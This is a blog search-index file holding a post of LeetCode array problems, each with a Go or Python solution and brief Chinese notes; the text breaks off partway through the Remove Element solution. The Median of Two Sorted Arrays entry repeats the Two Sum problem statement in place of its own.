<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>LeetCode-Array</title>
      <link href="/2020/12/15/LeetCode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(Array)/"/>
      <url>/2020/12/15/LeetCode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(Array)/</url>
      
        <content type="html"><![CDATA[<h1 id="LeetCode-topics-Array"><a href="#LeetCode-topics-Array" class="headerlink" title="LeetCode - topics: Array"></a>LeetCode - topics: Array</h1><h2 id="1-Two-Sum"><a href="#1-Two-Sum" class="headerlink" title="1. Two Sum"></a>1. Two Sum</h2><p>Given an array of integers <code>nums</code> and an integer <code>target</code>, return <em>indices of the two numbers such that they add up to <code>target</code></em>.</p><p>You may assume that each input would have <em>exactly one solution</em>, and you may not use the <em>same</em> element twice.</p><p>You can return the answer in any order.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [2,7,11,15], target &#x3D; 9</span><br><span class="line">Output: [0,1]</span><br><span class="line">Output: Because nums[0] + nums[1] &#x3D;&#x3D; 9, we return [0, 1].</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [3,2,4], target &#x3D; 6</span><br><span class="line">Output: [1,2]</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>2 &lt;= nums.length &lt;= 103</code></li><li><code>-109 &lt;= nums[i] &lt;= 109</code></li><li><code>-109 &lt;= target &lt;= 109</code></li><li><strong>Only one valid answer exists.</strong></li></ul><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">twoSum</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">mInt := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">another := target - nums[i]</span><br><span class="line"><span class="keyword">if</span> _, ok := mInt[another]; ok &#123;</span><br><span class="line"><span class="keyword">return</span> []<span class="keyword">int</span>&#123;mInt[another], i&#125;</span><br><span class="line">&#125;</span><br><span class="line">mInt[nums[i]] = i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>牺牲空间换时间</p></blockquote><h2 id="2-Median-of-Two-Sorted-Arrays"><a href="#2-Median-of-Two-Sorted-Arrays" class="headerlink" title="2. Median of Two Sorted Arrays"></a>2. Median of Two Sorted Arrays</h2><p>Given an array of integers <code>nums</code> and an integer <code>target</code>, return <em>indices of the two numbers such that they add up to <code>target</code></em>.</p><p>You may assume that each input would have <em>exactly one solution</em>, and you may not use the <em>same</em> element twice.</p><p>You can return the answer in any order.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [2,7,11,15], target &#x3D; 9</span><br><span class="line">Output: [0,1]</span><br><span class="line">Output: Because nums[0] + nums[1] &#x3D;&#x3D; 9, we return [0, 1].</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [3,2,4], target &#x3D; 6</span><br><span class="line">Output: [1,2]</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>2 &lt;= nums.length &lt;= 103</code></li><li><code>-109 &lt;= nums[i] &lt;= 109</code></li><li><code>-109 &lt;= target &lt;= 109</code></li><li><strong>Only one valid answer exists.</strong></li></ul><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findMedianSortedArrays</span><span class="params">(nums1 []<span class="keyword">int</span>, nums2 []<span class="keyword">int</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(nums1) &gt; <span class="built_in">len</span>(nums2) &#123;</span><br><span class="line"><span class="keyword">return</span> findMedianSortedArrays(nums2, nums1)</span><br><span class="line">&#125;</span><br><span class="line">    low, high, middleMerg, midNum1, midNum2 := <span class="number">0</span>, <span class="built_in">len</span>(nums1), (<span class="built_in">len</span>(nums1)+<span class="built_in">len</span>(nums2)+<span class="number">1</span>)&gt;&gt;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> low &lt;= high &#123;</span><br><span class="line">midNum1 = low + (high-low)&gt;&gt;<span class="number">1</span></span><br><span class="line">midNum2 = middleMerg - midNum1</span><br><span class="line"><span class="keyword">if</span> midNum1 &gt; <span class="number">0</span> &amp;&amp; nums1[midNum1<span class="number">-1</span>] &gt; nums2[midNum2] &#123;</span><br><span class="line">high = midNum1 - <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> midNum1 &lt; <span class="built_in">len</span>(nums1) &amp;&amp; nums1[midNum1] &lt; nums2[midNum2<span class="number">-1</span>] &#123;</span><br><span class="line">low = midNum1 + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">midL, midR := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> midNum2 == <span class="number">0</span> &#123;</span><br><span class="line">midL = nums1[midNum1<span class="number">-1</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> midNum1 == <span class="number">0</span> &#123;</span><br><span class="line">midL = nums2[midNum2<span class="number">-1</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">midL = max(nums1[midNum1<span class="number">-1</span>], nums2[midNum2<span class="number">-1</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(nums2)+<span class="built_in">len</span>(nums1))&amp;<span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">float64</span>(midL)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> midNum1 == <span class="built_in">len</span>(nums1) &#123;</span><br><span class="line">midR = nums2[midNum2]</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> midNum2 == <span class="built_in">len</span>(nums2) &#123;</span><br><span class="line">midR = nums1[midNum1]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">midR = min(nums1[midNum1], nums2[midNum2])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">float64</span>(midR+midL) / <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(i <span class="keyword">int</span>, i2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> i &lt; i2 &#123;</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> i2</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(i <span class="keyword">int</span>, i2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> i &gt; i2 &#123;</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> i2</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-1"><a href="#Note-1" class="headerlink" title="Note:"></a>Note:</h3><p><a href="https://books.halfrost.com/leetcode/ChapterFour/0004.Median-of-Two-Sorted-Arrays/" target="_blank" rel="noopener">0004. Median of Two Sorted Arrays | LeetCode Cookbook</a></p><h2 id="11-Container-With-Most-Water"><a href="#11-Container-With-Most-Water" class="headerlink" title="11. Container With Most Water"></a>11. Container With Most Water</h2><p>Given <code>n</code> non-negative integers <code>a1, a2, ..., an</code> , where each represents a point at coordinate <code>(i, ai)</code>. <code>n</code> vertical lines are drawn such that the two endpoints of the line <code>i</code> is at <code>(i, ai)</code> and <code>(i, 0)</code>. Find two lines, which, together with the x-axis forms a container, such that the container contains the most water.</p><p><strong>Notice</strong> that you may not slant the container.</p><p><strong>Example 1:</strong></p><p><img src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: height &#x3D; [1,8,6,2,5,4,8,3,7]</span><br><span class="line">Output: 49</span><br><span class="line">Explanation: The above vertical lines are represented by array [1,8,6,2,5,4,8,3,7]. In this case, the max area of water (blue section) the container can contain is 49.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: height &#x3D; [1,1]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>n = height.length</code></li><li><code>2 &lt;= n &lt;= 3 * 104</code></li><li><code>0 &lt;= height[i] &lt;= 3 * 104</code></li></ul><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxArea</span><span class="params">(height []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">start := <span class="number">0</span></span><br><span class="line">end := <span class="built_in">len</span>(height) - <span class="number">1</span></span><br><span class="line">tempMax := <span class="number">0</span></span><br><span class="line">h := <span class="number">0</span></span><br><span class="line">w := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> start &lt;= end &#123;</span><br><span class="line">w = end - start</span><br><span class="line"><span class="keyword">if</span> height[start] &gt; height[end] &#123;</span><br><span class="line">h = height[end]</span><br><span class="line">end--</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">h = height[start]</span><br><span class="line">start++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> h*w &gt; tempMax &#123;</span><br><span class="line">tempMax = h * w</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tempMax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-2"><a href="#Note-2" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>对撞指针，注意和连续面积的题目做区分。</p></blockquote><h2 id="15-3Sum"><a href="#15-3Sum" class="headerlink" title="15. 3Sum"></a>15. 3Sum</h2><p>Given an array <code>nums</code> of <em>n</em> integers, are there elements <em>a</em>, <em>b</em>, <em>c</em> in <code>nums</code> such that <em>a</em> + <em>b</em> + <em>c</em> = 0? Find all unique triplets in the array which gives the sum of zero.</p><p>Notice that the solution set must not contain duplicate triplets.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [-1,0,1,2,-1,-4]</span><br><span class="line">Output: [[-1,-1,2],[-1,0,1]]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; []</span><br><span class="line">Output: []</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [0]</span><br><span class="line">Output: []</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 3000</code></li><li><code>-105 &lt;= nums[i] &lt;= 105</code></li></ul><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        res = []</span><br><span class="line">        nums.sort()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i, a <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> a == nums[i - <span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            l, r = i + <span class="number">1</span>, len(nums) - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> l &lt; r:</span><br><span class="line">                threeSum = a + nums[l] + nums[r]</span><br><span class="line">                <span class="keyword">if</span> threeSum &gt; <span class="number">0</span>:</span><br><span class="line">                    r -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> threeSum &lt; <span class="number">0</span>:</span><br><span class="line">                    l += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res.append([a, nums[l], nums[r]])</span><br><span class="line">                    l += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> nums[l] == nums[l - <span class="number">1</span>] <span class="keyword">and</span> l &lt; r:</span><br><span class="line">                        l += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="Note-3"><a href="#Note-3" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>先排序，方便移动左右’指针’,注意对排序后的数组进行剪枝;对结果重复项要注意</p></blockquote><h2 id="16-3Sum-Closest"><a href="#16-3Sum-Closest" class="headerlink" title="16. 3Sum Closest"></a>16. 3Sum Closest</h2><p>Given an array <code>nums</code> of <em>n</em> integers and an integer <code>target</code>, find three integers in <code>nums</code> such that the sum is closest to <code>target</code>. Return the sum of the three integers. You may assume that each input would have exactly one solution.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [-1,2,1,-4], target &#x3D; 1</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The sum that is closest to the target is 2. (-1 + 2 + 1 &#x3D; 2).</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>3 &lt;= nums.length &lt;= 10^3</code></li><li><code>-10^3 &lt;= nums[i] &lt;= 10^3</code></li><li><code>-10^4 &lt;= target &lt;= 10^4</code></li></ul><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSumClosest</span><span class="params">(self, nums: List[int], target: int)</span> -&gt; int:</span></span><br><span class="line">        nums.sort()</span><br><span class="line">        diff = <span class="number">1</span>&lt;&lt;<span class="number">31</span></span><br><span class="line">        <span class="keyword">for</span> i, a <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            l, r = i + <span class="number">1</span>, len(nums) - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> l &lt; r:</span><br><span class="line">                threeSum = a + nums[l] + nums[r]</span><br><span class="line">                <span class="keyword">if</span> abs(target - threeSum) &lt; abs(diff):</span><br><span class="line">                    diff = target - threeSum</span><br><span class="line">                <span class="keyword">if</span> diff == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> target</span><br><span class="line">                <span class="keyword">if</span> threeSum &gt; target:</span><br><span class="line">                    r -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    l += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> target - diff</span><br></pre></td></tr></table></figure><h3 id="Note-4"><a href="#Note-4" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>[3Sum](#15. 3Sum)的兄弟题，判断离target最近的一个组合，先排序，然后进行三数加和，通过加和结果与target的大小比较，移动指针（排序的意义)</p></blockquote><h2 id="18-4Sum"><a href="#18-4Sum" class="headerlink" title="18. 4Sum"></a>18. 4Sum</h2><p>Given an array <code>nums</code> of <em>n</em> integers and an integer <code>target</code>, are there elements <em>a</em>, <em>b</em>, <em>c</em>, and <em>d</em> in <code>nums</code> such that <em>a</em> + <em>b</em> + <em>c</em> + <em>d</em> = <code>target</code>? Find all unique quadruplets in the array which gives the sum of <code>target</code>.</p><p><strong>Notice</strong> that the solution set must not contain duplicate quadruplets.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [1,0,-1,0,-2,2], target &#x3D; 0</span><br><span class="line">Output: [[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [], target &#x3D; 0</span><br><span class="line">Output: []</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 200</code></li><li><code>-109 &lt;= nums[i] &lt;= 109</code></li><li><code>-109 &lt;= target &lt;= 109</code></li></ul><h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def fourSum(self, nums: List[<span class="keyword">int</span>], target: <span class="keyword">int</span>) -&gt; List[List[<span class="keyword">int</span>]]:</span><br><span class="line">        twoSumDict = &#123;&#125;</span><br><span class="line">        result = []</span><br><span class="line">        mark = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> j in <span class="keyword">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(nums)):</span><br><span class="line">                n1 = nums[i]</span><br><span class="line">                n2 = nums[j]</span><br><span class="line">                others = twoSumDict.get(target - n1 - n2)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> others is not None:</span><br><span class="line">                    <span class="keyword">for</span> item in others:</span><br><span class="line">                        n3, n4, i3, i4 = item</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(set([i, j, i3, i4])) == <span class="number">4</span>:</span><br><span class="line">                            res = [n1, n2, n3, n4]</span><br><span class="line">                            res.sort()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> res not in mark:</span><br><span class="line">                                result.<span class="built_in">append</span>(res)</span><br><span class="line">                                mark.<span class="built_in">append</span>(res)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> n1 + n2 not in twoSumDict:</span><br><span class="line">                    twoSumDict[n1 + n2] = [(n1, n2, i, j)]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    twoSumDict[n1 + n2].<span class="built_in">append</span>((n1, n2, i, j))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h3 id="Note-5"><a href="#Note-5" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>[Two Sum](#1. Two Sum)的扩展，原来是一个和一个相对应，现在两两一组去进行判断，注意返回结果对重复值的剔除，对判断细节要注意。</p></blockquote><h2 id="26-Remove-Duplicates-from-Sorted-Array"><a href="#26-Remove-Duplicates-from-Sorted-Array" class="headerlink" title="26. Remove Duplicates from Sorted Array"></a>26. Remove Duplicates from Sorted Array</h2><p>Given a sorted array <em>nums</em>, remove the duplicates <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener"><strong>in-place</strong></a> such that each element appears only <em>once</em> and returns the new length.</p><p>Do not allocate extra space for another array, you must do this by <strong>modifying the input array <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener">in-place</a></strong> with O(1) extra memory.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [1,1,2]</span><br><span class="line">Output: 2, nums &#x3D; [1,2]</span><br><span class="line">Explanation: Your function should return length &#x3D; 2, with the first two elements of nums being 1 and 2 respectively. It doesn&#39;t matter what you leave beyond the returned length.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [0,0,1,1,1,2,2,3,3,4]</span><br><span class="line">Output: 5, nums &#x3D; [0,1,2,3,4]</span><br><span class="line">Explanation: Your function should return length &#x3D; 5, with the first five elements of nums being modified to 0, 1, 2, 3, and 4 respectively. It doesn&#39;t matter what values are set beyond the returned length.</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 3 * 104</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li><li><code>nums</code> is sorted in ascending order.</li></ul><h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般解法可能是直接set,remove啥的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeDuplicates</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">point := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line"><span class="keyword">if</span> nums[i] != nums[i<span class="number">-1</span>] &#123;</span><br><span class="line">point++</span><br><span class="line">nums[point] = nums[i]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> point + <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-6"><a href="#Note-6" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>不要直接用builtin函数，注意<code>It doesn&#39;t matter what values are set beyond the returned length.</code>,就可以用以上的解法，只要找到所有的不重复数字，然后一个一个覆盖填充，剩下的部分无需理会。</p></blockquote><h2 id="27-Remove-Element"><a href="#27-Remove-Element" class="headerlink" title="27. Remove Element"></a>27. Remove Element</h2><p>Given an array <em>nums</em> and a value <em>val</em>, remove all instances of that value <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener"><strong>in-place</strong></a> and return the new length.</p><p>Do not allocate extra space for another array, you must do this by <strong>modifying the input array <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener">in-place</a></strong> with O(1) extra memory.</p><p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [3,2,2,3], val &#x3D; 3</span><br><span class="line">Output: 2, nums &#x3D; [2,2]</span><br><span class="line">Explanation: Your function should return length &#x3D; 2, with the first two elements of nums being 2.</span><br><span class="line">It doesn&#39;t matter what you leave beyond the returned length. For example if you return 2 with nums &#x3D; [2,2,3,3] or nums &#x3D; [2,3,0,0], your answer will be accepted.</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 100</code></li><li><code>0 &lt;= nums[i] &lt;= 50</code></li><li><code>0 &lt;= val &lt;= 100</code></li></ul><h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 